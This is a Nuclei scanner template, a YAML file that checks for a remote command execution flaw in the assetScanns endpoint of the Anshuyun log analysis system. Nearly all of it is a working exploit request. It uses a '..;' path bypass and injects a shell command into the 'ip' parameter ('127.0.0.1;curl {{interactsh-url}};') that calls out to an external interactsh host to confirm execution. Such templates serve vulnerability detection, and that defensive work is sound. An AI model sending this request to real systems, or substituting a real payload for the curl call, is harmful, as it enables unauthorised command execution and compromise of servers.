id: anshuyun-assetScanns-RCE

info:
  name: 安数云综合日志分析系统 assetScanns 远程命令执行漏洞
  author: anshuyun
  severity: high
  tags: RCE

http:
  - raw:
      - |
        POST /js/..;/assetTopo/assetScanns HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Content-Type: application/x-www-form-urlencoded

        ip=127.0.0.1;curl {{interactsh-url}};&port=80

    max-redirects: 3
    matchers:
      - type: dsl
        dsl:
          - "contains(interactsh_protocol, 'http') || contains(interactsh_protocol, 'dns')"
          - "status_code == 200"
        condition: and
      - type: word
        part: body
        words:
          - '"message":'
          - '"status":'
        condition: and
    matchers-condition: and